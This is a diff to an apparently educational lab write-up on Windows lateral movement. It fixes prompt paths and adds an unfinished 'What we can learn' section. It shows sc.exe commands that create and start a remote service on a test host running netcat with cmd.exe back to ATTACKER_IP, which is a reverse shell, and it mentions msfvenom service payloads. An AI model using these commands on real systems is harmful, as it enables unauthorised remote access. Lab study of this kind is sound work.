@@ -108,7 +108,7 @@ The listener on port **8888** will receive a remote command prompt on `jmp.test.
 
 {% code title="jmp.test.com (admin)" %}
 ```
-C:\Windows/system32> whoami
+C:\Windows\system32> whoami
 user
 ```
 {% endcode %}
@@ -158,12 +158,23 @@ _**(2)**_ It will not work expected if we tried to establish a reverse shell con
 
 {% code title="jmp.test.com (admin)" overflow="wrap" %}
 ```powershell
-C:\Windows/system32> sc.exe \\iis.test.com create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 9999" start= auto
+C:\Windows\system32> sc.exe \\iis.test.com create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 9999" start= auto
 
-C:\Windows/system32> sc.exe \\iis.test.com start <servicename>
+C:\Windows\system32> sc.exe \\iis.test.com start <servicename>
 ```
 {% endcode %}
 
 More accurately, this action will actually establish a remote shell on the target `iis.test.com` server, but will be terminated shortly after.
 
 This is because the service manager expects the executable that is being executed to function as a service executable (perform certain actions), which is different from standard `.exe` files, as with what we have provided. The method we have explored with `msfvenom` works as it encapsulates the payload within a valid service executable.
+
+### What we can learn
+
+1. `smbclient` automatically uploads to the `...` directory
+
+* We can observe this from ....
+
+
+
+2. ...
+
